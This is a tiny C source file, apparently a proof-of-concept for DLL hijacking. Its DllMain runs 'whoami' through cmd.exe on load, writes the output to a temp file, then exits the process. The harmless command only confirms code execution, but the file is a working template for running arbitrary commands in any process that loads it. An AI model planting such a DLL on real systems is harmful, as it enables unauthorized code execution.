// Minimalistic approach
// x86_64-w64-mingw32-gcc run_dll1.c -o lib.dll -shared

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c whoami > %TEMP%\\whoami.txt");
        ExitProcess(0);
    }
    return TRUE;
}